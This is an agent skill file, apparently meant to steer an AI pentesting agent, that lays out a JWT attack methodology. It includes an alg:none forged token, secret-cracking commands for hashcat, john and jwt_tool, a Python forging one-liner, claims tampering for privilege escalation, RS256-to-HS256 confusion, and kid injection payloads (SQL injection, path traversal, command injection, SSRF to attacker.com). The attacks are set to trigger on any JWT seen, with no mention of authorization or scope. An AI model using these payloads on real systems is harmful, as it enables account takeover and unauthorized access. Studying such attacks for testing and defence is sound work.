---
name: jwt-attack-methodology
description: "JWT token attack methodology. Use when a response header or cookie contains an eyJ-prefixed string (three-part base64, Header.Payload.Signature), when an Authorization: Bearer token is present, or when an API returns token/access_token fields. Covers alg:none bypass, weak secret cracking (full hashcat/john/c-jwt-cracker/jwt_tool toolchain), claims tampering privilege escalation, RS256->HS256 algorithm confusion, kid injection (SQL/path traversal/command injection), and jku/x5u substitution. Note: use cookie-analysis for non-JWT cookie analysis"
zh-signals: "JWT 令牌攻击方法论，覆盖 alg:none、弱密钥爆破、Claims 篡改、算法混淆与 kid/jku 注入。信号:JWT,token,算法混淆,密钥爆破,kid注入"
when-to-use: >-
  Use when a response header, cookie, or Authorization bearer token contains a three-part
  base64 JWT (eyJ...) or API token fields, and you need to test signature, claims, and key-handling weaknesses.
metadata:
  tags: "jwt,json web token,authentication,token,none-algorithm,weak-secret,bearer,eyJ,jwt_tool,HS256,RS256,kid,jku,algorithm confusion,secret cracking"
  category: "exploit"
---

# JWT Attack Methodology

## Phase 1: Obtain and Decode the JWT
1. Log in to obtain a token (check the Set-Cookie response header and JSON fields in the response body)
2. Confirm the JWT format: three Base64 segments separated by `.` (Header.Payload.Signature)
3. Decode it with the jwt_decode tool or manually with `echo '<part>' | base64 -d`:
   - Header: check the `alg` field (HS256/RS256/none) and the `kid`/`jku`/`x5u` parameters
   - Payload: check claims such as `sub`, `role`, `admin`, `is_admin`, `user_id`, `exp`
   - Record the signing algorithm, expiration time, and key privilege fields
4. Check whether the token is expired: convert the `exp` field to a Unix timestamp and compare it with the current time
5. Compare the JWTs of different users to find differences in privilege-related fields

## ⛔ Deep Reference (must read once a JWT is found)

- RS256→HS256 algorithm confusion, kid injection (SQL/path traversal/command injection), jku/x5u substitution → [references/jwt-advanced.md](references/jwt-advanced.md)
- Full weak secret cracking toolchain (hashcat/john/c-jwt-cracker/jwt_tool/Python + weak secret pattern table) → [references/jwt-advanced.md](references/jwt-advanced.md)

## Phase 2: None Algorithm Attack
1. Change `alg` in the Header to `none` and delete the Signature part (keep the trailing `.`)
2. Re-encode the Header and Payload in Base64 and concatenate them into `header.payload.`
3. Send the request and observe whether the server accepts an unsigned token
4. Try case-variant bypasses: `"none"`, `"None"`, `"NONE"`, `"nOnE"`, `"NoNe"`
5. Some libraries only bypass when alg is exactly `"none"`, so test each variant
```
Original: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SIGNATURE
Forged: eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

## Phase 3: Weak Secret Cracking (HS256/HS384/HS512 only)
1. Manually test common weak secrets: `secret`, `password`, `123456`, `key`, `jwt_secret`, `changeme`, `""` (empty string)
2. Crack offline with hashcat: `hashcat -m 16500 jwt.txt wordlist.txt`
3. Use john: `john jwt.txt --wordlist=wordlist.txt --format=HMAC-SHA256`
4. Lightweight tool c-jwt-cracker: `./jwtcrack <token>` (pure brute force, suited to short secrets)
5. All-in-one tool jwt_tool: `python3 jwt_tool.py <token> -C -d wordlist.txt`
6. Forge a token once the secret is known:
```python
import jwt; print(jwt.encode({'user':'admin','role':'admin'}, 'SECRET_KEY', algorithm='HS256'))
```
→ **Full cracking toolchain and weak secret pattern table** → [references/jwt-advanced.md](references/jwt-advanced.md)

## Phase 4: Claims Tampering
1. Decode the Payload and list every claims field
2. Modify privilege-related fields: `role:user→admin` | `is_admin:false→true` | `user_id:5→1`
3. Try adding new fields: `"admin":true`, `"groups":["admin"]`
4. Modify `exp` to extend the token lifetime (for example, a 2099 timestamp)
5. Re-sign with the known secret, replace the original token, and send the request
6. Compare the responses to confirm the privilege escalation (check the HTTP status code, response content, and accessible endpoints)

## Phase 5: RS256→HS256 Algorithm Confusion
1. Confirm the server signs with RS256 (asymmetric)
2. Obtain the public key: request `/api/jwks`, `/.well-known/jwks.json`, `/oauth/jwks`
3. Change `alg` in the Header from `RS256` to `HS256`
4. Sign the token using the RS256 public key as the HS256 symmetric secret
5. Send the tampered token and exploit the business logic flaw where the server verifies the HMAC with the public key
→ Detailed principles and scripts → [references/jwt-advanced.md](references/jwt-advanced.md)

## Phase 6: kid Parameter Injection
1. Check whether the JWT Header contains a `kid` (Key ID) field
2. SQL injection: `"kid":"1' UNION SELECT 'my-key' -- "` → sign with `my-key`
3. Path traversal: `"kid":"../../dev/null"` → sign using the empty file content as the secret
4. Command injection: `"kid":"key|cat /flag.txt"` → some implementations execute shell commands
5. SSRF: `"kid":"http://attacker.com/key"` → fetch the secret from the attacker server
→ Full payloads → [references/jwt-advanced.md](references/jwt-advanced.md)
